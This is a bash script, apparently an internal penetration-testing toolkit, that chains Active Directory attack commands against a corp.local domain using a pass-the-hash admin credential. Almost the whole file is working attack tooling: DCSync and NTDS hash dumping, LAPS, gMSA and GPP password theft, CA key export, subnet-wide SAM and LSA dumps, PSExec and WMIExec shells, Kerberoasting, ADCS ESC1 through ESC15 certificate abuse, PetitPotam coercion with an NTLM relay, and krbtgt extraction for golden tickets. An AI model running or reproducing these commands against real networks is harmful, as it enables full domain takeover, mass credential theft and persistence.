#!/bin/bash

# ===========================================
# Internal Penetration Test Script
# ===========================================

# --- CONFIGURATION ---
DOMAIN="corp.local"
NETBIOS="CORP"
ADMIN_USER="john.admin"
HASH="aabbccdd11223344aabbccdd11223344"
DC_IP="10.0.0.100"
CA_SERVER="CA.CORP.LOCAL"
CA_NAME="CORP-CA"
SUBNET="10.0.0.0/24"

# --- OUT OF SCOPE IPs ---
EXCLUDE_FILE=""

# --- OUTPUT DIRECTORY ---
TIMESTAMP=$(date +%Y%m%d_%H%M%S)
OUTPUT_DIR="./pentest_results_${TIMESTAMP}"
mkdir -p "$OUTPUT_DIR"

echo "[*] Results will be saved to: $OUTPUT_DIR"
echo "[*] Domain: $DOMAIN"
echo "[*] Admin: $ADMIN_USER"
echo "[*] DC: $DC_IP"
if [[ -f "$EXCLUDE_FILE" ]]; then
    echo "[*] Excluding IPs from: $EXCLUDE_FILE"
    EXCLUDE_OPT="--exclude-hosts $EXCLUDE_FILE"
else
    echo "[!] Warning: $EXCLUDE_FILE not found - no IPs will be excluded"
    EXCLUDE_OPT=""
fi
echo ""

# --- HELPER FUNCTION ---
run_cmd() {
    local description="$1"
    local output_file="$2"
    local cmd="$3"
    
    echo "[*] Running: $description"
    echo "[*] Output: $output_file"
    eval "$cmd" 2>&1 | tee "$OUTPUT_DIR/$output_file"
    echo ""
}

prompt_target() {
    read -p "[?] Enter target IP: " TARGET_IP
    echo "$TARGET_IP"
}

prompt_continue() {
    read -p "[?] Run $1? (y/n): " choice
    [[ "$choice" == "y" || "$choice" == "Y" ]]
}

# ===========================================
# POST-DA ENUMERATION
# ===========================================

echo "=========================================="
echo "POST-DA ENUMERATION"
echo "=========================================="

if prompt_continue "DCSync - dump all domain hashes"; then
    run_cmd "DCSync" "dcsync_full.txt" \
        "secretsdump.py -hashes ':$HASH' $DOMAIN/$ADMIN_USER@$DC_IP"
fi

if prompt_continue "NTDS.dit extraction"; then
    run_cmd "NTDS.dit" "ntds_dump.txt" \
        "secretsdump.py -hashes ':$HASH' -just-dc $DOMAIN/$ADMIN_USER@$DC_IP"
fi

if prompt_continue "LAPS passwords"; then
    run_cmd "LAPS" "laps_passwords.txt" \
        "nxc ldap $DC_IP -u $ADMIN_USER -H $HASH -M laps"
fi

if prompt_continue "gMSA passwords"; then
    run_cmd "gMSA" "gmsa_passwords.txt" \
        "nxc ldap $DC_IP -u $ADMIN_USER -H $HASH --gmsa"
fi

if prompt_continue "GPP passwords"; then
    run_cmd "GPP Passwords" "gpp_passwords.txt" \
        "Get-GPPPassword.py $DOMAIN/$ADMIN_USER@$DC_IP -hashes ':$HASH'"
fi

if prompt_continue "Export CA private key backup"; then
    run_cmd "CA Backup" "ca_backup.txt" \
        "certipy ca -backup -ca '$CA_NAME' -u $ADMIN_USER@$DOMAIN -hashes ':$HASH'"
fi

# ===========================================
# LATERAL MOVEMENT
# ===========================================

echo "=========================================="
echo "LATERAL MOVEMENT"
echo "=========================================="

if prompt_continue "RDP access sweep"; then
    run_cmd "RDP Sweep" "rdp_access.txt" \
        "nxc rdp $SUBNET -u $ADMIN_USER -H $HASH $EXCLUDE_OPT"
fi

if prompt_continue "WinRM access sweep"; then
    run_cmd "WinRM Sweep" "winrm_access.txt" \
        "nxc winrm $SUBNET -u $ADMIN_USER -H $HASH $EXCLUDE_OPT"
fi

if prompt_continue "SMB access sweep"; then
    run_cmd "SMB Sweep" "smb_access.txt" \
        "nxc smb $SUBNET -u $ADMIN_USER -H $HASH $EXCLUDE_OPT"
fi

if prompt_continue "PSExec shell"; then
    TARGET_IP=$(prompt_target)
    run_cmd "PSExec" "psexec_${TARGET_IP}.txt" \
        "psexec.py -hashes ':$HASH' $DOMAIN/$ADMIN_USER@$TARGET_IP"
fi

if prompt_continue "WMIExec shell"; then
    TARGET_IP=$(prompt_target)
    run_cmd "WMIExec" "wmiexec_${TARGET_IP}.txt" \
        "wmiexec.py -hashes ':$HASH' $DOMAIN/$ADMIN_USER@$TARGET_IP"
fi

if prompt_continue "SQL Server access sweep"; then
    run_cmd "MSSQL Sweep" "mssql_access.txt" \
        "nxc mssql $SUBNET -u $ADMIN_USER -H $HASH $EXCLUDE_OPT"
fi

# ===========================================
# CREDENTIAL HARVESTING
# ===========================================

echo "=========================================="
echo "CREDENTIAL HARVESTING"
echo "=========================================="

if prompt_continue "LSA secrets sweep"; then
    run_cmd "LSA Secrets" "lsa_secrets.txt" \
        "nxc smb $SUBNET -u $ADMIN_USER -H $HASH --lsa $EXCLUDE_OPT"
fi

if prompt_continue "SAM dump sweep"; then
    run_cmd "SAM Dump" "sam_dump.txt" \
        "nxc smb $SUBNET -u $ADMIN_USER -H $HASH --sam $EXCLUDE_OPT"
fi

if prompt_continue "Kerberoasting"; then
    run_cmd "Kerberoast" "kerberoast.txt" \
        "GetUserSPNs.py -dc-ip $DC_IP $DOMAIN/$ADMIN_USER -hashes ':$HASH' -request"
fi

if prompt_continue "AS-REProasting"; then
    if [[ -f users.txt ]]; then
        run_cmd "AS-REP Roast" "asreproast.txt" \
            "GetNPUsers.py $DOMAIN/ -dc-ip $DC_IP -usersfile users.txt -no-pass"
    else
        echo "[!] users.txt not found - create a list of usernames first"
        read -p "[?] Enter path to users file: " USERS_FILE
        run_cmd "AS-REP Roast" "asreproast.txt" \
            "GetNPUsers.py $DOMAIN/ -dc-ip $DC_IP -usersfile $USERS_FILE -no-pass"
    fi
fi

# ===========================================
# ACTIVE DIRECTORY ENUMERATION
# ===========================================

echo "=========================================="
echo "ACTIVE DIRECTORY ENUMERATION"
echo "=========================================="

if prompt_continue "BloodHound collection"; then
    run_cmd "BloodHound" "bloodhound.txt" \
        "bloodhound-python -u $ADMIN_USER --hashes ':$HASH' -d $DOMAIN -dc $DC_IP -c All"
fi

if prompt_continue "Domain trusts enumeration"; then
    run_cmd "Domain Trusts" "domain_trusts.txt" \
        "nxc ldap $DC_IP -u $ADMIN_USER -H $HASH -M enum_trusts"
fi

if prompt_continue "Delegation enumeration"; then
    run_cmd "Delegation" "delegation.txt" \
        "findDelegation.py -dc-ip $DC_IP $DOMAIN/$ADMIN_USER -hashes ':$HASH'"
fi

if prompt_continue "Enterprise Admins enumeration"; then
    run_cmd "Enterprise Admins" "enterprise_admins.txt" \
        "nxc ldap $DC_IP -u $ADMIN_USER -H $HASH -M groupmembership -o GROUP='Enterprise Admins'"
fi

if prompt_continue "Schema Admins enumeration"; then
    run_cmd "Schema Admins" "schema_admins.txt" \
        "nxc ldap $DC_IP -u $ADMIN_USER -H $HASH -M groupmembership -o GROUP='Schema Admins'"
fi

if prompt_continue "Backup Operators enumeration"; then
    run_cmd "Backup Operators" "backup_operators.txt" \
        "nxc ldap $DC_IP -u $ADMIN_USER -H $HASH -M groupmembership -o GROUP='Backup Operators'"
fi

# ===========================================
# NETWORK SERVICES
# ===========================================

echo "=========================================="
echo "NETWORK SERVICES"
echo "=========================================="

if prompt_continue "MSSQL linked servers check"; then
    read -p "[?] Enter SQL Server IP: " SQL_SERVER
    run_cmd "MSSQL Linked" "mssql_linked_${SQL_SERVER}.txt" \
        "mssqlclient.py -hashes ':$HASH' $DOMAIN/$ADMIN_USER@$SQL_SERVER -windows-auth"
fi

if prompt_continue "Spooler service check"; then
    run_cmd "Spooler" "spooler_check.txt" \
        "nxc smb $SUBNET -u $ADMIN_USER -H $HASH -M spooler $EXCLUDE_OPT"
fi

if prompt_continue "WebDAV check"; then
    run_cmd "WebDAV" "webdav_check.txt" \
        "nxc smb $SUBNET -u $ADMIN_USER -H $HASH -M webdav $EXCLUDE_OPT"
fi

if prompt_continue "SCCM/MECM check"; then
    run_cmd "SCCM" "sccm_check.txt" \
        "nxc smb $SUBNET -u $ADMIN_USER -H $HASH -M sccm $EXCLUDE_OPT"
fi

# ===========================================
# FILE SHARES
# ===========================================

echo "=========================================="
echo "FILE SHARES"
echo "=========================================="

if prompt_continue "List all shares"; then
    run_cmd "Shares List" "shares_list.txt" \
        "nxc smb $SUBNET -u $ADMIN_USER -H $HASH --shares $EXCLUDE_OPT"
fi

if prompt_continue "Spider shares for sensitive files"; then
    TARGET_IP=$(prompt_target)
    run_cmd "Spider Shares" "spider_${TARGET_IP}.txt" \
        "nxc smb $TARGET_IP -u $ADMIN_USER -H $HASH -M spider_plus"
fi

# ===========================================
# VULNERABILITY CHECKS
# ===========================================

echo "=========================================="
echo "VULNERABILITY CHECKS"
echo "=========================================="

if prompt_continue "MS17-010 EternalBlue check"; then
    run_cmd "MS17-010" "ms17010_check.txt" \
        "nxc smb $SUBNET -u $ADMIN_USER -H $HASH -M ms17-010 $EXCLUDE_OPT"
fi

if prompt_continue "Zerologon check"; then
    run_cmd "Zerologon" "zerologon_check.txt" \
        "nxc smb $DC_IP -u '' -p '' -M zerologon"
fi

if prompt_continue "PrintNightmare check"; then
    run_cmd "PrintNightmare" "printnightmare_check.txt" \
        "nxc smb $SUBNET -u $ADMIN_USER -H $HASH -M printnightmare $EXCLUDE_OPT"
fi

if prompt_continue "noPac check"; then
    run_cmd "noPac" "nopac_check.txt" \
        "nxc smb $DC_IP -u $ADMIN_USER -H $HASH -M nopac"
fi

if prompt_continue "PetitPotam coercion test"; then
    read -p "[?] Enter your listener IP: " LISTENER_IP
    run_cmd "PetitPotam" "petitpotam.txt" \
        "python3 PetitPotam.py -d $DOMAIN -u $ADMIN_USER -hashes ':$HASH' $LISTENER_IP $DC_IP"
fi

# ===========================================
# ADCS ATTACKS
# ===========================================

echo "=========================================="
echo "ADCS ATTACKS"
echo "=========================================="

if prompt_continue "Certipy find (enumerate ADCS)"; then
    run_cmd "Certipy Find" "certipy_find.txt" \
        "certipy find -u $ADMIN_USER@$DOMAIN -hashes ':$HASH' -dc-ip $DC_IP -vulnerable"
fi

if prompt_continue "ESC1 exploitation"; then
    read -p "[?] Enter vulnerable template name: " TEMPLATE
    read -p "[?] Enter target UPN (e.g. administrator@$DOMAIN): " TARGET_UPN
    run_cmd "ESC1" "esc1_exploit.txt" \
        "certipy req -u $ADMIN_USER@$DOMAIN -hashes ':$HASH' -dc-ip $DC_IP -ca '$CA_NAME' -template '$TEMPLATE' -upn '$TARGET_UPN'"
fi

if prompt_continue "ESC3 exploitation"; then
    read -p "[?] Enter Certificate Request Agent template name: " AGENT_TEMPLATE
    run_cmd "ESC3 Stage 1" "esc3_stage1.txt" \
        "certipy req -u $ADMIN_USER@$DOMAIN -hashes ':$HASH' -dc-ip $DC_IP -ca '$CA_NAME' -template '$AGENT_TEMPLATE'"
    
    read -p "[?] Enter PFX filename from stage 1: " PFX_FILE
    read -p "[?] Enter target user (e.g. CORP\\administrator): " ON_BEHALF
    run_cmd "ESC3 Stage 2" "esc3_stage2.txt" \
        "certipy req -u $ADMIN_USER@$DOMAIN -hashes ':$HASH' -dc-ip $DC_IP -ca '$CA_NAME' -template 'User' -on-behalf-of '$ON_BEHALF' -pfx '$PFX_FILE'"
fi

if prompt_continue "ESC4 exploitation"; then
    read -p "[?] Enter vulnerable template name: " TEMPLATE
    run_cmd "ESC4 Modify Template" "esc4_modify.txt" \
        "certipy template -u $ADMIN_USER@$DOMAIN -hashes ':$HASH' -dc-ip $DC_IP -template '$TEMPLATE' -save-old"
    
    read -p "[?] Enter target UPN (e.g. administrator@$DOMAIN): " TARGET_UPN
    run_cmd "ESC4 Exploit" "esc4_exploit.txt" \
        "certipy req -u $ADMIN_USER@$DOMAIN -hashes ':$HASH' -dc-ip $DC_IP -ca '$CA_NAME' -template '$TEMPLATE' -upn '$TARGET_UPN'"
    
    echo "[!] Remember to restore template: certipy template -u $ADMIN_USER@$DOMAIN -hashes ':$HASH' -dc-ip $DC_IP -template '$TEMPLATE' -configuration ${TEMPLATE}.json"
fi

if prompt_continue "ESC8 relay setup"; then
    echo "[*] Run this in one terminal:"
    echo "    ntlmrelayx.py -t http://$CA_SERVER/certsrv/certfnsh.asp -smb2support --adcs --template 'Machine'"
    echo ""
    echo "[*] Run PetitPotam in another terminal to trigger coercion"
    read -p "[?] Press enter when ready to continue..."
fi

if prompt_continue "ESC15 exploitation"; then
    read -p "[?] Enter vulnerable template name: " TEMPLATE
    read -p "[?] Enter target UPN (e.g. administrator@$DOMAIN): " TARGET_UPN
    read -p "[?] Enter target SID (e.g. S-1-5-21-...-500): " TARGET_SID
    run_cmd "ESC15" "esc15_exploit.txt" \
        "certipy req -u $ADMIN_USER@$DOMAIN -hashes ':$HASH' -dc-ip $DC_IP -ca '$CA_NAME' -template '$TEMPLATE' -upn '$TARGET_UPN' -sid '$TARGET_SID'"
fi

if prompt_continue "Certipy auth (use captured cert)"; then
    read -p "[?] Enter PFX filename: " PFX_FILE
    run_cmd "Certipy Auth" "certipy_auth.txt" \
        "certipy auth -pfx '$PFX_FILE' -domain $DOMAIN -dc-ip $DC_IP"
fi

# ===========================================
# PERSISTENCE (DOCUMENTATION ONLY)
# ===========================================

echo "=========================================="
echo "PERSISTENCE CHECKS"
echo "=========================================="

if prompt_continue "DSRM check"; then
    run_cmd "DSRM" "dsrm_check.txt" \
        "nxc smb $DC_IP -u $ADMIN_USER -H $HASH -x 'reg query HKLM\\System\\CurrentControlSet\\Control\\Lsa /v DsrmAdminLogonBehavior'"
fi

if prompt_continue "Extract krbtgt hash for golden ticket"; then
    run_cmd "krbtgt Hash" "krbtgt_hash.txt" \
        "secretsdump.py -hashes ':$HASH' $DOMAIN/$ADMIN_USER@$DC_IP -just-dc-user krbtgt"
fi

# ===========================================
# SUMMARY
# ===========================================

echo "=========================================="
echo "SCAN COMPLETE"
echo "=========================================="
echo "[*] All results saved to: $OUTPUT_DIR"
echo "[*] Files created:"
ls -la "$OUTPUT_DIR"
